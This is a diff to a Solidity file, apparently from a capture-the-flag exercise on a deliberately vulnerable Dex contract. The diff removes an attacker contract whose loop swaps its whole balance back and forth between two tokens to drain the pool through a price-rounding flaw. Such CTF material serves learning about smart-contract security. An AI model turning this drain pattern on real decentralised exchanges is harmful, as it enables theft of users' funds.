@@ -5,13 +5,6 @@ import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
 import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 import 'lib/openzeppelin-contracts/contracts/access/Ownable.sol';
 
-interface IDex {
-  function token1() external view returns (address);
-  function token2() external view returns (address);
-  function swap(address from, address to, uint amount) external;
-  function approve(address spender, uint amount) external;
-}
-
 contract Dex is Ownable {
   address public token1;
   address public token2;
@@ -60,37 +53,4 @@ contract SwappableToken is ERC20 {
     require(owner != _dex, "InvalidApprover");
     super._approve(owner, spender, amount);
   }
-}
-
-contract DexAttacker {
-
-  IDex public dex;
-  IERC20 public token1;
-  IERC20 public token2;
-  
-  constructor(address dexAddr) {
-    dex = IDex(dexAddr);
-    token1 = IERC20(dex.token1());
-    token2 = IERC20(dex.token2());
-  }
-
-  function fire() internal {
-      require(token1.balanceOf(address(this)) == 10, "I need some tokens!!!");
-      require(token2.balanceOf(address(this)) == 10, "I need some tokens!!!");
-      token1.transfer(address(dex), 10);
-      for (uint i = 0; i < 11; i++) {
-        if (i % 2 == 0) {
-            uint orig = token2.balanceOf(address(this));
-            token2.approve(address(dex), orig);
-            dex.swap(address(token2), address(token1), orig);
-        }
-        else {
-            uint orig = token1.balanceOf(address(this));
-            token1.approve(address(dex), orig);
-            dex.swap(address(token1), address(token2), orig);
-        }            
-      }
-      token1.approve(address(dex), 76);
-      dex.swap(address(token1), address(token2), 34);
-    }
 }
